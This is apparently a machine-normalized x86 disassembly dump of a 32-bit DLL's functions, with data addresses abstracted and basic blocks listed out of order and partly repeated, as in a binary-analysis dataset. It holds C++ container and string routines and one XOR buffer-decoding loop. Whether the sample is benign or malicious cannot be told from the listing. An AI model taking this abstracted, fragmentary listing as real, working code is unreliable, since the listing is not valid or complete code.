push eax
mov eax ebx
sub eax [ ebp + 0x10 ]
sar eax 0x3
sub esi eax
call sub_1000b4d1
mov [ ebp - 0x4 ] 0x2
add [ edi + 0x10 ] 0x8
mov edi [ edi + 0x10 ]
mov esi [ ebp + 0x10 ]
add edi 0xfffffff8
jmp r-xdata
add [ ebp - 0x18 ] ecx
and [ ebp - 0x18 ] 0x0
jmp r-xdata
lea edi [ eax + 0x8 ]
mov esi eax
cmp eax edi
je r-xdata
mov edi esi
sub edi ebx
cmp esi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
call sub_1000b734
mov ecx [ ebp + 0x10 ]
sub ecx [ edi + 0xc ]
and [ ebp + 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
sar ecx 0x3
push ebx
xor esi esi
lea ebx [ eax + ecx * 8 ]
inc esi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] ecx
call sub_1000b4d1
mov ebx [ ebp - 0x1c ]
mov ecx [ edi + 0xc ]
push ebx
push [ ebp + 0x10 ]
mov [ ebp + 0x8 ] esi
call sub_1000b780
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x10 ]
lea eax [ ebx + eax * 8 + 0x8 ]
push eax
push [ edi + 0x10 ]
mov [ ebp + 0x8 ] 0x2
call sub_1000b780
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi + 0x10 ]
mov eax [ edi + 0xc ]
mov esi ecx
sub esi eax
sar esi 0x3
inc esi
test eax eax
je r-xdata
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] eax
jae r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x20 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x24 ]
call sub_100137aa
add esi 0x8
cmp esi edi
jne r-xdata
sub ebx 0x8
lea esi [ edi + ebx ]
mov eax ebx
call sub_100137aa
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
call sub_100137aa
add esi 0x8
jmp r-xdata
mov eax [ ebp - 0x18 ]
lea eax [ ebx + eax * 8 ]
mov [ edi + 0x14 ] eax
lea eax [ ebx + esi * 8 ]
mov [ edi + 0x10 ] eax
mov [ edi + 0xc ] ebx
jmp r-xdata
push ecx
call sub_100095c8
push [ edi + 0xc ]
call sub_1002004f
pop ecx
call sub_10023f0b
retn 0xc
call sub_1000ad5c
sub_1000b5f7
cmp [ ebp + 0x8 ] 0x1
mov esi [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
jle r-xdata
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jle r-xdata
lea eax [ esi + edi * 8 ]
push eax
mov eax esi
call sub_100095c8
push esi
call sub_1002004f
pop ecx
push ebx
push ebx
call sub_10023a01
sub ecx [ ebp + 0x10 ]
mov eax [ ebx ]
xor esi esi
sar ecx 0x3
inc esi
add ebx 0x4
cmp ecx esi
mov [ ebp - 0x24 ] eax
push ebx
lea ecx [ ebp - 0x20 ]
jae r-xdata
lea eax [ esi + edi * 8 + 0x8 ]
push eax
lea eax [ esi + edi * 8 ]
call sub_100095c8
call sub_1000ad88
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
push esi
lea ebx [ esi - 0x8 ]
push esi
mov ecx ebx
call sub_1000b780
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
call sub_1000ad88
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x8 ]
push eax
push [ edi + 0x10 ]
call sub_1000b780
mov [ ebp - 0x4 ] 0x3
mov ebx [ edi + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
sub eax [ ebp + 0x10 ]
sar eax 0x3
sub esi eax
call sub_1000b4d1
mov [ ebp - 0x4 ] 0x2
add [ edi + 0x10 ] 0x8
mov edi [ edi + 0x10 ]
mov esi [ ebp + 0x10 ]
add edi 0xfffffff8
jmp r-xdata
lea edi [ eax + 0x8 ]
mov esi eax
cmp eax edi
je r-xdata
mov edi esi
sub edi ebx
cmp esi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x20 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x24 ]
call sub_100137aa
add esi 0x8
cmp esi edi
jne r-xdata
sub ebx 0x8
lea esi [ edi + ebx ]
mov eax ebx
call sub_100137aa
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
call sub_100137aa
add esi 0x8
jmp r-xdata
call sub_10023f0b
retn 0xc
call sub_1000ad5c
sub_1000b734
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x8
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x3
push eax
call sub_10020186
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_100201fc
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10023a01
int3
sub_1000b780
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_1000b7cd
add esp 0xc
pop edi
leave
retn 0x8
sub_1000b7a4
push esi
mov esi eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
ja r-xdata
test esi esi
je r-xdata
pop esi
retn
dec [ esp + 0x8 ]
add esi 0x8
mov eax [ edi ]
mov [ esi ] eax
lea eax [ edi + 0x4 ]
push eax
lea ecx [ esi + 0x4 ]
call sub_1000ad88
sub_1000b7cd
push esi
push edi
mov edi eax
mov esi ecx
jmp r-xdata
cmp esi [ esp + 0xc ]
jne r-xdata
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
retn
add edi 0x8
add esi 0x8
mov eax [ esi ]
mov [ edi ] eax
lea eax [ esi + 0x4 ]
push eax
lea ecx [ edi + 0x4 ]
call sub_1000ad88
sub_1000b829
push 0x48
mov eax sub_1004a047
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
push 0xf
pop esi
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x10 ]
mov edi ecx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x30 ] esi
call sub_10002493
mov [ ebp - 0x4 ] ebx
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] esi
call sub_10002493
push [ ebp - 0x4c ]
mov edx [ ebp - 0x54 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000b93b
mov eax [ edi ]
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
call sub_10023f1f
retn 0xc
push [ ebp - 0x4c ]
mov ecx [ ebp - 0x50 ]
lea edi [ ebp - 0x2c ]
call sub_1000ba5b
sub_1000b8bb
push 0x4c
mov eax sub_1004ac62
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
xor esi esi
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x14 ] 0xf
call sub_10002493
mov ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp - 0x34 ]
mov [ ebp - 0x4 ] esi
push edi
call sub_1000b829
push r--data
lea ecx [ ebp - 0x54 ]
call sub_100012f3
lea eax [ ebp - 0x2c ]
push eax
push edi
lea edx [ ebp - 0x54 ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_1000c173
push esi
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10002597
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax ebx
call sub_10023f1f
retn 0x8
sub_1000b93b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004a00f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov [ esp + 0x18 ] eax
mov edi edx
mov [ esp + 0x1c ] ecx
call sub_10002521
mov eax [ edi + 0x14 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x4
push 0xf
pop esi
push ebx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x70 ] esi
call sub_10002493
mov ecx [ esp + 0x14 ]
add ecx 0x4
push edi
lea edx [ esp + 0x58 ]
mov [ esp + 0x84 ] ebx
call sub_1000bd83
pop ecx
push ebx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x54 ] esi
call sub_10002493
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0x84 ] 0x1
call sub_1000bc0a
pop ecx
push ebx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] esi
call sub_10002493
lea eax [ esp + 0x38 ]
push eax
lea edi [ esp + 0x20 ]
mov [ esp + 0x84 ] 0x2
call sub_1000bba6
pop ecx
mov ecx [ esp + 0x18 ]
push 0xffffffff
push ebx
mov eax edi
push eax
call sub_100021b2
push ebx
push 0x1
mov ecx edi
call sub_100023ce
push ebx
push 0x1
lea ecx [ esp + 0x40 ]
call sub_100023ce
push ebx
push 0x1
lea ecx [ esp + 0x5c ]
call sub_100023ce
sub_1000ba5b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10049fcf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x64 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ecx
call sub_10002521
push 0xf
pop esi
xor ebx ebx
push ebx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x70 ] esi
call sub_10002493
lea eax [ esp + 0x14 ]
push edi
push eax
mov [ esp + 0x88 ] ebx
call sub_10013a52
pop ecx
pop ecx
mov [ esp + 0x80 ] 0x1
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
xor eax eax
add eax 0x4
jmp r-xdata
push ebx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] esi
call sub_10002493
lea ebx [ esp + 0x1c ]
lea ecx [ esp + 0x54 ]
mov [ esp + 0x80 ] 0x2
call sub_1000bcca
mov [ esp + 0x50 ] esi
xor esi esi
push esi
lea ecx [ esp + 0x3c ]
call sub_10002493
mov ecx [ esp + 0xc ]
mov eax ebx
add ecx 0x4
push eax
lea edx [ esp + 0x3c ]
mov [ esp + 0x84 ] 0x3
call sub_1000bd83
pop ecx
mov ecx [ esp + 0x10 ]
push 0xffffffff
push esi
lea eax [ esp + 0x40 ]
push eax
call sub_100021b2
push esi
push 0x1
lea ecx [ esp + 0x40 ]
call sub_100023ce
push esi
push 0x1
mov ecx ebx
call sub_100023ce
push esi
push 0x1
lea ecx [ esp + 0x5c ]
call sub_100023ce
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x64 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x4
call sub_1000ad5c
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x60 ]
call sub_100021b2
mov [ esp + 0x80 ] bl
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
sub_1000bba6
push 0x40
mov eax sub_10049f8a
call sub_10023e9c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
mov ecx [ eax + 0x14 ]
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push ecx
push eax
lea esi [ ebp - 0x30 ]
call sub_10013a24
lea eax [ ebp - 0x4c ]
xor esi esi
push eax
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] esi
call sub_10013b7d
pop ecx
push 0xffffffff
push esi
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_100021b2
push esi
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_100023ce
lea ecx [ ebp - 0x30 ]
call sub_10013a3f
call sub_10023f1f
retn
sub_1000bc0a
push 0x70
mov eax sub_1004910e
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x38 ] eax
mov eax [ esi + 0x14 ]
xor edi edi
push edi
shl eax 0x6
push eax
lea ecx [ ebp - 0x30 ]
call sub_10005ad1
mov [ ebp - 0x4 ] edi
cmp [ esi + 0x18 ] 0x10
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x14 ]
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push eax
push esi
lea eax [ ebp - 0x34 ]
call sub_1001571e
cmp eax edi
je r-xdata
lea ebx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ebx [ ebp - 0x2c ]
jae r-xdata
push [ ebp - 0x34 ]
lea eax [ ebp - 0x30 ]
push edi
push eax
lea esi [ ebp - 0x54 ]
call sub_1000c399
mov ecx [ ebp - 0x38 ]
push 0xffffffff
push edi
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100021b2
push edi
push 0x1
mov ecx esi
call sub_100023ce
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100023ce
call sub_10023f1f
retn
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001d1f
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001d6b
push r--data
lea eax [ ebp - 0x7c ]
push eax
call sub_10023a01
sub_1000bcca
push 0x6c
mov eax sub_100490d1
call sub_10023e9c
mov esi ecx
mov eax [ esi + 0x14 ]
xor edi edi
push edi
shl eax 0x6
push eax
lea ecx [ ebp - 0x30 ]
call sub_10005ad1
mov [ ebp - 0x4 ] edi
cmp [ esi + 0x18 ] 0x10
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x14 ]
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push eax
push esi
lea eax [ ebp - 0x34 ]
call sub_10015794
cmp eax edi
je r-xdata
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
jae r-xdata
push [ ebp - 0x34 ]
lea eax [ ebp - 0x30 ]
push edi
push eax
lea esi [ ebp - 0x50 ]
call sub_1000c399
push 0xffffffff
push edi
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_100021b2
push edi
push 0x1
mov ecx esi
call sub_100023ce
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100023ce
call sub_10023f1f
retn
push r--data
lea ecx [ ebp - 0x50 ]
call sub_10001d1f
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001d6b
push r--data
lea eax [ ebp - 0x78 ]
push eax
call sub_10023a01
sub_1000bd83
push 0x50
mov eax sub_1004909e
call sub_10023e33
mov ebx ecx
mov edi edx
mov esi [ ebp + 0x8 ]
mov eax [ ebx + 0x14 ]
mov [ ebp - 0x18 ] eax
test eax eax
ja r-xdata
mov eax [ esi + 0x14 ]
push 0x0
push eax
mov ecx edi
mov [ ebp - 0x14 ] eax
call sub_1000c375
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push r--data
lea ecx [ ebp - 0x34 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x5c ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x5c ]
push eax
call sub_10023a01
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
lea esi [ ebx + 0x4 ]
mov esi [ ebx + 0x4 ]
jmp r-xdata
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
call sub_10023f0b
retn
sub ecx eax
mov edx [ ebp - 0x14 ]
xor edi edi
test edx edx
jbe r-xdata
mov bl [ ecx + eax ]
xor bl [ edi + esi ]
inc edi
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
xor edi edi
cmp edi [ ebp - 0x18 ]
jbe r-xdata
sub_1000be2a
push 0x88
mov eax sub_1004a48d
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x10 ]
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] edi
call sub_100012f3
xor esi esi
lea eax [ ebp - 0x2c ]
inc esi
push eax
lea ebx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] esi
call sub_10012344
pop ecx
push edi
push esi
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call sub_10002597
lea ecx [ ebp - 0x2c ]
lea ebx [ ebp - 0x94 ]
call sub_1001250f
push r--data
push eax
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x50 ]
call sub_10009652
add esp 0xc
push edi
push esi
mov ecx ebx
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x4 ] 0x3
call sub_10002597
push [ ebp - 0x50 ]
lea eax [ ebp - 0x4c ]
push eax
call sub_100104ac
push edi
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x60 ] 0xf
call sub_10002493
lea eax [ ebp - 0x78 ]
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x4c ]
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000b829
push edi
push esi
lea ecx [ ebp - 0x78 ]
call sub_100023ce
lea ecx [ ebp - 0x4c ]
call sub_100104f6
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10002597
mov eax [ ebp - 0x50 ]
call sub_10023f1f
retn 0xc
sub_1000bf0c
push ebp
sub esp 0xac
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xac ] eax
push 0x74
mov eax sub_1004ac27
call sub_10023e66
mov eax [ ebp + 0xb8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xbc ]
xor esi esi
mov [ ebp - 0x4 ] esi
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x2c ] esi
call sub_1000b385
mov [ ebp - 0x4 ] esi
inc esi
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x2c ] esi
call sub_100012f3
lea eax [ ebp + 0x20 ]
push eax
lea ebx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] esi
call sub_10012344
pop ecx
xor edi edi
push edi
push esi
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call sub_10002597
push edi
lea eax [ ebp + 0x20 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_1000cc87
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000da90
push edi
push esi
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x6
call sub_10002597
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x1c ]
cmp ecx edi
je r-xdata
push [ ebp - 0x20 ]
lea eax [ ebp + 0x3c ]
push eax
call sub_1000ccbe
lea eax [ ebp + 0x3c ]
push eax
lea ecx [ ebp + 0x90 ]
mov [ ebp - 0x4 ] 0x7
call sub_100020c6
push r--data
lea ecx [ ebp + 0x74 ]
mov [ ebp - 0x4 ] 0x8
call sub_100012f3
mov [ ebp - 0x4 ] 0x9
mov eax [ ebp + 0xa4 ]
push [ ebp + 0x88 ]
sub eax [ ebp + 0x88 ]
lea ecx [ ebp + 0x90 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_1000925c
mov ecx eax
lea eax [ ebp + 0x74 ]
mov [ ebp - 0x4 ] 0xa
call sub_10006bb3
mov bl al
neg bl
push edi
sbb bl bl
push esi
lea ecx [ ebp - 0x48 ]
inc bl
call sub_10002597
test bl bl
jne r-xdata
push edi
push esi
lea ecx [ ebp + 0x20 ]
call sub_10002597
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xac ]
xor ecx ebp
call sub_10020040
add ebp 0xb0
leave
retn 0x8
call sub_1000ad5c
push edi
push esi
lea ecx [ ebp + 0x74 ]
call sub_10002597
push edi
push esi
lea ecx [ ebp + 0x90 ]
call sub_10002597
push edi
push esi
lea ecx [ ebp + 0x3c ]
mov [ ebp - 0x4 ] 0x6
call sub_10002597
lea eax [ ebp - 0x20 ]
push edi
push eax
call sub_1001d450
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp + 0x90 ]
push eax
lea eax [ ebp ]
push eax
mov [ ebp - 0x4 ] 0xb
call sub_100104ac
push edi
lea ecx [ ebp + 0x58 ]
mov [ ebp + 0x70 ] 0xf
call sub_10002493
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xd
call sub_10001d1f
lea eax [ ebp + 0x58 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push [ ebp - 0x18 ]
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xe
call sub_1000b829
push edi
push esi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xd
call sub_100023ce
lea eax [ ebp + 0x58 ]
push eax
push [ ebp - 0x18 ]
lea edx [ ebp + 0x90 ]
lea ecx [ ebp - 0x28 ]
call sub_1000c173
mov [ ebp - 0x4 ] 0xf
cmp [ ebp - 0x28 ] edi
je r-xdata
cmp [ ebp - 0x20 ] edi
setne al
test al al
je r-xdata
mov [ ebp - 0x4 ] 0xd
mov ecx [ ebp - 0x24 ]
cmp ecx edi
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x14 ]
call sub_1000b3c2
push edi
push esi
lea ecx [ ebp + 0x58 ]
call sub_100023ce
lea ecx [ ebp ]
call sub_100104f6
mov [ ebp - 0x4 ] 0x9
jmp r-xdata
call sub_1000ad5c
sub_1000c173
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ab7d
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xf0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x108 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x14 ]
xor edi edi
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] ebx
cmp eax 0x4
jbe r-xdata
mov [ ecx ] edi
push edi
add ecx 0x4
call sub_1000cd5f
push edi
push edi
push [ esp + 0x20 ]
call sub_100289c4
mov eax [ esp + 0x24 ]
add esp 0xc
mov ecx [ esp + 0x108 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xf0 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x8
push edx
lea ecx [ esp + 0xcc ]
call sub_100020c6
mov edi r--data
push edi
lea ecx [ esp + 0xcc ]
mov [ esp + 0x114 ] ebx
call sub_1000ccf6
test eax eax
jne r-xdata
lea eax [ esp + 0x3c ]
push eax
mov ecx esi
call sub_1000c3c7
push 0x4
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x44 ]
push eax
mov [ esp + 0x11c ] 0x2
call sub_1000c9b3
cmp [ esp + 0x14 ] 0x5
mov [ esp + 0x13 ] 0x1
jb r-xdata
push esi
lea eax [ esp + 0x24 ]
push eax
push [ esp + 0x24 ]
call sub_1000be2a
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0xd4 ]
mov [ esp + 0x11c ] 0x1
call sub_10002033
push ebx
push 0x1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x118 ] bl
call sub_10002597
push 0xffffffff
push [ esp + 0x18 ]
push esi
lea esi [ esp + 0xf0 ]
call sub_1000c399
push 0x5c
mov [ esp + 0x114 ] 0x3
call sub_10020186
pop ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x110 ] 0x4
cmp eax ebx
je r-xdata
push 0x1
lea eax [ esp + 0x17 ]
push eax
lea eax [ esp + 0x44 ]
push eax
call sub_1000c9b3
cmp [ esp + 0x13 ] bl
jne r-xdata
xor eax eax
lea ecx [ esp + 0xc8 ]
push ecx
mov ecx esi
push ecx
push eax
call sub_100100e1
jmp r-xdata
push edi
lea ecx [ esp + 0xcc ]
call sub_10001444
push ebx
push 0x1
lea ecx [ esp + 0xec ]
mov edi eax
call sub_100023ce
lea eax [ esp + 0x3c ]
mov [ esp + 0x110 ] bl
call sub_1000c359
or [ esp + 0x110 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0xd0 ]
call sub_10002597
mov ecx [ esp + 0x18 ]
sub_1000c375
mov edx [ ecx + 0x14 ]
mov eax [ esp + 0x4 ]
cmp eax edx
ja r-xdata
push [ esp + 0x8 ]
sub eax edx
push eax
call sub_10005af7
push 0xffffffff
push eax
call sub_10002143
jmp r-xdata
retn 0x8
sub_1000c399
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10002493
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100021b2
mov eax esi
leave
retn 0xc
sub_1000c3c7
push 0x8
mov eax sub_10049f5f
call sub_10023e33
mov ebx ecx
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0xc ]
xor esi esi
push eax
inc esi
push edi
mov [ ebp - 0x10 ] esi
call sub_1000ca8e
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
lea esi [ edi + 0xc ]
push esi
mov [ edi + eax ] r--data
mov [ ebp - 0x14 ] esi
call sub_1000cb0a
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
cmp [ ebx + 0x18 ] 0x10
mov eax [ ebx + 0x14 ]
jb r-xdata
add ebx 0x4
mov ebx [ ebx + 0x4 ]
jmp r-xdata
mov eax edi
call sub_10023f0b
retn 0x4
push ebx
mov ebx eax
call sub_1000cb56
and [ esi + 0x3c ] 0x0
and [ esi + 0x40 ] 0x0
test eax eax
je r-xdata
sub_1000c458
push 0x4
mov eax sub_1004896f
call sub_10023e33
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_1000c4bb
mov ecx esi
call sub_1000c490
call sub_10023f0b
retn
sub_1000c4bb
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
mov ecx esi
pop esi
jmp sub_1000d8e6
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_1002004f
pop ecx
sub_1000c504
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx ]
test edi edi
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
